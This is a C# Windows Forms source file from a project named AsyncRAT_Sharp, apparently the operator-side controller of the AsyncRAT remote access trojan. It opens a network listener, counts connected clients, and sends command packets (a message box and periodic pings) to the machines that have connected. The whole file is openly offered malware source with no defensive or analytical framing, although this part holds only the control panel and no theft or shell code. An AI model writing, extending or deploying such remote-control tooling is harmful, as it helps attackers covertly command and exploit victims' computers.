using System;
using System.Windows.Forms;
using AsyncRAT_Sharp.MessagePack;
using AsyncRAT_Sharp.Sockets;
using System.Threading.Tasks;
using Microsoft.VisualBasic;
using System.Linq;

namespace AsyncRAT_Sharp
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

       async private void Form1_Load(object sender, EventArgs e)
        {
            Listener listener = new Listener();
            listener.Connect(Settings.Port);

            while (true)
            {
                await Task.Delay(1000);
                toolStripStatusLabel1.Text = string.Format("Online {0}", Settings.Online.Count.ToString());
            }
        }

        private void sendMessageToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                string URL = Interaction.InputBox("Message", "Message", "Hello World!");
                if (string.IsNullOrEmpty(URL))
                    return;
                else
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "MessageBox";
                    msgpack.ForcePathObject("Message").AsString = URL;
                    foreach (ListViewItem C in listView1.SelectedItems)
                    {
                        Clients CL = (Clients)C.Tag;
                        CL.BeginSend(msgpack.Encode2Bytes());
                    }
                }
            }
        }

        private void listView1_Resize(object sender, EventArgs e)
        {
           listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
        }

        private void ping_Tick(object sender, EventArgs e)
        {
            if (Settings.Online.Count > 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "Ping";
                msgpack.ForcePathObject("Message").AsString = "This is a ping!";
                foreach (Clients CL in Settings.Online.ToList())
                {
                    CL.BeginSend(msgpack.Encode2Bytes());
                }
            }
        }

    }
}